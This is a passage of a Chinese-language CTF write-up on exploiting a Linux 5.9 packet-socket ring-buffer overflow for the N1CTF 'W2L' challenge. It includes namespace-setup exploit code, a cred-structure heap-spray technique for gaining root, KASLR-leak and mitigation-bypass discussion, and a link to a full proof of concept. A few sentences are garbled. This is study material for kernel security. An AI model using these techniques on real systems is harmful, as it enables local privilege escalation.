@@ -1,0 +1,183 @@
+            //调用者在新名称空间中获得了完整的功能集。
+            if (unshare(CLONE_NEWUSER) != 0) {
+                    perror("[-] unshare(CLONE_NEWUSER)");
+                    exit(EXIT_FAILURE);
+            }
+            //取消共享网络名称空间，以便将调用进程移到新的网络名称空间，
+            //该名称空间不会与任何先前存在的进程共享。 
+            //使用CLONE_NEWNET需要CAP_SYS_ADMIN功能。
+            if (unshare(CLONE_NEWNET) != 0) {
+                    perror("[-] unshare(CLONE_NEWNET)");
+                    exit(EXIT_FAILURE);
+            }
+            //写了"deny"到文件/proc/[pid]/setgroups， 
+            //是为了限制在新user namespace里面调用setgroups函数来设置groups
+            if (!write_file("/proc/self/setgroups", "deny")) {
+                    perror("[-] write_file(/proc/self/set_groups)");
+                    exit(EXIT_FAILURE);
+            }
+            if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
+                    perror("[-] write_file(/proc/self/uid_map)");
+                    exit(EXIT_FAILURE);
+            }
+            if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
+                    perror("[-] write_file(/proc/self/gid_map)");
+                    exit(EXIT_FAILURE);
+            }
+            //将进程绑定到cpu0，主要是为了让之后分配的slub
+            //在一个__per_cpu_offset内便于之后进行堆喷
+            cpu_set_t my_set;
+            CPU_ZERO(&my_set);
+            CPU_SET(0, &my_set);
+            if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
+                    perror("[-] sched_setaffinity()");
+                    exit(EXIT_FAILURE);
+            }
+            if (system("/sbin/ifconfig lo up") != 0) {
+                    perror("[-] system(/sbin/ifconfig lo up)");
+                    exit(EXIT_FAILURE);
+            }
+    }
+###  spray cred
+由于本题是在kernel
+5.9内，原poc无论是泄露KASLR还是后续利用的方法在当前内核版本均不能使用（之后的章节会进行详细阐述），并且本题环境中没有`/dev/ptmx`无法使用修改`tty_struct`劫持
+ioctl 指针这种常规方法。经过尝试可以用spray cred结构后通过漏洞溢出修改cred结构体完成提权。
+在创建进程时每个进程都会将当前进程凭证存储在 `struct cred`结构体中，它通过`kmalloc`分配空间，`kmalloc`底层通过`slab
+allocator`进行分配，而为了提升性能减少重复的申请和释放，会用多个`slab`组成一个对应特定大小的缓存，在释放操作时并不会真正的释放，而是放入缓存修改成未使用状态，等下一次有相同大小的内存申请时直接从缓存返回，而不需要再次真正的申请物理内存，大小为`2^n`。kernel
+5.9中的大小为168。
+    ivan@ubuntu:~/kernel/linux-5.9-patched$ pahole -C cred ./vmlinux 
+    die__process_function: tag not supported (INVALID)!
+    struct cred {
+        atomic_t    usage;    /*     0     4 */
+        kuid_t    uid;     /*     4     4 */
+        kgid_t    gid;    /*     8     4 */
+        kuid_t    suid;    /*    12     4 */
+        kgid_t    sgid;    /*    16     4 */
+        kuid_t    euid;    /*    20     4 */
+        kgid_t    egid;     /*    24     4 */
+        kuid_t     fsuid;    /*    28     4 */
+        kgid_t     fsgid;    /*    32     4 */
+        unsigned int     securebits;    /*    36     4 */
+        kernel_cap_t    cap_inheritable;    /*    40     8 */
+        kernel_cap_t     cap_permitted;    /*    48     8 */
+        kernel_cap_t     cap_effective;    /*    56     8 */
+        /* --- cacheline 1 boundary (64 bytes) --- */
+        kernel_cap_t     cap_bset;    /*    64     8 */
+        kernel_cap_t     cap_ambient;    /*    72     8 */
+        unsigned char    jit_keyring;    /*    80     1 */
+        /* XXX 7 bytes hole, try to pack */
+        struct key *    session_keyring;      /*    88     8 */
+        struct key *    process_keyring;      /*    96     8 */
+        struct key *    thread_keyring;       /*   104     8 */
+        struct key *    request_key_auth;     /*   112     8 */
+        void *    security;             /*   120     8 */
+        /* --- cacheline 2 boundary (128 bytes) --- */
+        struct user_struct *    user;    /*   128     8 */
+        struct user_namespace *    user_ns;    /*   136     8 */
+        struct group_info *    group_info;    /*   144     8 */
+        union {
+            int    non_rcu;    /*           4 */
+            struct callback_head rcu;    /*          16 */
+        };         /*   152    16 */
+        /* size: 168, cachelines: 3, members: 25 */
+        /* sum members: 161, holes: 1, sum holes: 7 */
+        /* last cacheline: 40 bytes */
+    };
+因为,128     : tunables    : slabdata   
+    ...
+    cred_jar            2856   2856    192   21    1 : tunables    0    0    0 : slabdata    136    136 0
+    ...
+因此先使用`fork()`创建多个进程进行堆喷将`cred_jar`的`cahce`耗尽，之后再创建一个大小为`0x8000`的`ring_buffer`的`packet_sock`，申请`block`会使`page
+allocator`的`freelist`中的相应大小的页耗尽，因为申请物理页的大小也是按`2^n`计算，这样之后再申请就会从第一个大于`n`的`m`且`freelist`中不为空的`2^m`大小的页中分割内存。
+之后
+申请一个`packet_sock`并且设置一个有两个块大小为`0x8000`的`ring_buffer`，再多次调用`fork()`进行填充，由于`cred_jar`缓存和`freelist`中相应大小的页中都已耗尽，这样它们会有很大机会在更大的页上被连续得分配。
+大致排布结构如下：
+    +-------------+--------+-----+--------+--------+
+    |    block    |  cred  | ... |  cred  |  cred  |
+    +-------------+--------+-----+--------+--------+
+排布完毕后剩下的就是触发漏洞，将 cred 结构体 uid 到 fsgid 值全部置为0即可完成提权。
+另外，由于本题在进行漏洞利用前设置了命名空间，所以不能简单的使用`getuid() ==
+0`的方法判断是否为root权限，可以通过尝试打开root权限的文件来判断提权是否成功。
+运行效果如下：
+    / $ ./poc
+    [.] starting
+    [.] namespace sandbox set up
+    [.] padding heap
+    / $ id
+    uid=65534 gid=65534 groups=0(root)
+    / $ cat /root/flag
+    n1ctf{this is the flag}
+POC实现如下：[poc](https://raw.githubusercontent.com/yifengchen-cc/kernel-pwn/main/2020N1CTF-W2L%20%26%26%20CVE-2017-7038%E5%88%86%E6%9E%90/poc.c)
+## 后话
+因为写exp时尝试了一些其他方法在此也做一个记录，本小结主要分析官方writeup[5]里面绕过KASLR的通用方法及介绍iovec任意地址读写的方法。
+###  信息泄露
+在kernel4.8版本里dmesg可以泄露内核地址从而绕过KASLR，kernel5.9中则不行。官方题解中使用
+`user_key_payload`这个结构体通过堆喷后排布内存空间进而泄露内核地址绕过KASLR。
+首先来看下`user_key_payload`结构体：
+    //v5.9/source/include/keys/user-type.h#L27
+    struct user_key_payload {
+        struct rcu_head    rcu;        /* RCU destructor */
+        unsigned short    datalen;    /* length of this data */
+        char        data[] __aligned(__alignof__(u64)); /* actual data */
+    };
+该结构体的`datalen`字段记录了`data`的长度，因此如果可以通过越界写将`datalen`字段改为一个较大值，就可以泄露`data`后面的内容。
+在用户层使用`add_key()`函数时会引入`user_key_payload`结构体，`add_key()`函数主要是将密钥添加到内核的密钥管理。其引入该结构体的调用链如下：`__x64_sys_add_key()->key_create_or_update()->user_preparse()`。`user_preparse()`函数实现如下：
+    //v5.9/source/security/keys/user_defined.c#L59
+    int user_preparse(struct key_preparsed_payload *prep)
+    {
+        struct user_key_payload *upayload;
+        size_t datalen = prep->datalen;
+        ...
+        upayload = kmalloc(sizeof(*upayload) + datalen, GFP_KERNEL);
+        ...
+        /* attach the data */
+        prep->quotalen = datalen;
+        prep->payload.data[0] = upayload;
+        upayload->datalen = datalen;
+        memcpy(upayload->data, prep->data, datalen);
+        return 0;
+    }
+在调用`add_key()`添加key时，会通过`key_alloc()`创建`struct key`结构体。5.9版本`struct
+key`大小为216。因为192 datalen`字段为一较大值，之后在用户层调用`read_key`查看即可泄露`struct
+key`。但是当实际进行调试时发现`struct
+key`并不从`kmalloc-256`进行分配而是从另一大小同为256的`pool_workqueue`进行分配，实际构造排布如下：
+    +-------------+------------------+-----+------------------+
+    |    block    | user_key_payload | ... | user_key_payload |
+    +-------------+------------------+-----+------------------+
+虽然不能泄露`struct
+key`但在`add_key`时还在`kmalloc-512`引入了其他结构体而经过排布后`kmalloc-256`与`kmalloc-512`相邻，因此可以泄露`struct
+assoc_array_edit`中的`keyring_assoc_array_ops`进而绕过KASLR。引入该结构体的调用链如下：`__x64_sys_add_key()->lookup_user_key()->look_up_user_keyrings()->key_link()->__key_link_begin()->assoc_array_insert()`
+###  缓解绕过
+在泄露出内核地址后，最开始打算按照原poc的方法覆盖`packet_sock->rx_ring->prb_bdqc->retire_blk_timer`为`native_write_cr4`，通过`retire
+timer`超时后调用`retire_blk_timer->function(retire_blk_timer->data)`，由于`retire_blk_timer->data`可控，以此可以来绕过`SMEP`和`SMAP`。然而在kernel5.9中`timer_list`的data字段早已被移除[6]，这种方法就此失效。
+之后又尝试修改 iovec 进行任意内存读写，这个方法在Project Zero对于CVE-2019-2215的利用中有过提及[7]。
+`struct iovec`用于 Vectored I/O 也称 Scatter/Gather I/O。 Vectored I/O
+允许使用多个缓冲区写入数据流，或将数据流读取到多个缓冲区。它的优势是可以使用不连续的不同缓冲区进行写入或读取，而不会产生大量开销。
+iovec结构实现如下：
+    struct iovec
+    {
+        void __user *iov_base;    /* BSD uses caddr_t (1003.1g requires void *) */
+        __kernel_size_t iov_len; /* Must be size_t (1003.1g) */
+    };
+在Linux中，可使用iovec结构和系统调用（如readv，writev，recvmsg，sendmsg等）来实现 Vectored I/O 。
+`struct iovec`的主要问题之一是它使用周期短。
+在使用缓冲区时由系统调用分配，并在返回用户模式时立即释放。我们希望iovec结构在触发漏洞越界写时覆盖`iov_base`指针时保留在内核中，以获取范围内的读写。一种方法是在管道文件描述符上使用系统调用，例如readv，writev，因为它可以在管道已满或为空时阻塞。
+攻击方式如下：
+  * 初始化 iovec 数组
+  * 创建管道
+  * 在管道上调用writev函数
+  * 触发漏洞越界写iovec结构体的 `iov_base` 指向要读写的区域
+  * 调用read函数读取内核数据
+当时的思路是用这种方法读取`task_list`然后找到当前进程进而将当前进程cred覆写实现提权。但在实现过程中发现writev无法成功读取被修改的
+`iov_base`，查看源码后发现5.9内核添加了iovec在进行copyin，copyout前对输入地址的校验[8]，导致这种方法利用不成功（当时我尝试是这样的，如果有大佬尝试成功了请联系我）。
+## 总结
+这道题调了挺长时间的，对slab分配机制、堆喷占位的技巧有了更深入的认识，最后感谢ZhenpengLin师傅的帮助和指导 : )
+## 参考资料
+[1]   
+[2]   
+[3]   
+[4]   
+[5]   
+[6]   
+[7]   
+[8]
